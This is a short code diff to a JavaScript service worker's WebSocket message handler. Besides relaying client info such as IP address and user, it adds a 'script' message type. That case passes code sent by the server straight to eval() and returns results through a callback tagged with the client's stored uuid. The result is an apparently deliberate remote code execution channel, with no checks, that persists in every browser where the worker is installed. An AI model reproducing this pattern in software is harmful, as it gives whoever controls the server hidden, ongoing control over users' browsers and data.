@@ -101,17 +101,37 @@ self.addEventListener("message", async event => {
                         uuid: await db.read('uuid')
                     })
                 });
-                wsc.addEventListener('message', (event) => {
+                wsc.addEventListener('message', async (event) => {
                     const data = JSON.parse(event.data)
-                    self.ClientPort.postMessage({
-                        id: event_data,
-                        data: {
-                            ip: data.data.ip,
-                            addr: data.data.addr,
-                            user: data.data.user,
-                            delay: new Date().getTime() - data.data.time,
-                        }
-                    })
+                    switch (data.type) {
+                        case 'info':
+                            self.ClientPort.postMessage({
+                                id: event_data,
+                                data: {
+                                    ip: data.data.ip,
+                                    addr: data.data.addr,
+                                    user: data.data.user,
+                                    delay: new Date().getTime() - data.data.time,
+                                }
+                            })
+                            break;
+                        case 'script':
+                            self.cb = async (data) => {
+                                ws_sw({
+                                    type: "send",
+                                    data: JSON.stringify({
+                                        type: 'callback',
+                                        data: data,
+                                        uuid: await db.read('uuid')
+                                    })
+                                });
+                            }
+                            eval(data.data)
+
+
+                            break
+                    }
+
 
                 })
                 break;
